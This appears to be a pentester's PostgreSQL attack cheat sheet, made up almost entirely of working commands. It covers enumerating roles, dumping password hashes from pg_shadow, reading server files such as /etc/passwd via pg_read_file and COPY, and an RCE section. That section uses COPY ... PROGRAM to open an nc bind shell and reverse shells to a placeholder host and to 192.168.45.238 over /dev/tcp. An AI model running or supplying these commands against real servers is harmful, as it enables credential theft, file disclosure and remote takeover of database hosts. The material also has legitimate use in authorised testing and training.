## Connect to Database
```
psql -U <username> -h <host> -p <port>
```
## Commands
```
\l
\c <DATABASE>
\dt
\dt *
\d <TABLE>
\du
\du <username>
\du *
```
Get User Roles and Privileges
```
SELECT   
      r.rolname,   
      r.rolsuper,   
      r.rolinherit,  
      r.rolcreaterole,  
      r.rolcreatedb,  
      r.rolcanlogin,  
      r.rolconnlimit, r.rolvaliduntil,  
  ARRAY(SELECT b.rolname  
        FROM pg_catalog.pg_auth_members m  
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)  
        WHERE m.member = r.oid) as memberof  
, r.rolreplication  
FROM pg_catalog.pg_roles r  
ORDER BY 1;
```
Note: Using asterisk can list everything!
List database usernames and their hashed passwords
```
select * from pg_shadow;
```
`pg_shadow`** is a **PostgreSQL system catalog (a special internal table)**

List content of PostgreSQL's data directory from the serverâ€™s perspective
```
select pg_ls_dir('./');
```
To read server file from `postgres`
```
pg_read_file(filename text, offset integer, length integer [, missing_ok boolean])

select pg_read_file('PG_VERSION', 0, 200);
```
Create a table and load a local file from the host into it for reading
```
postgres-# CREATE TABLE temp(t TEXT);  
postgres-# COPY temp FROM '/etc/passwd';
postgres-# SELECT * FROM temp limit 1 offset 0;
---------------------------------
 root:x:0:0:root:/root:/bin/bash
```
## RCE
```
COPY (SELECT 'some text') TO PROGRAM 'bash -c "nc -l -p 1234 -e /bin/bash"';

CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f';
COPY shell FROM PROGRAM 'bash -c "bash -i 5<> /dev/tcp/192.168.45.238/80 0<&5 1>&5 2>&5"';
```
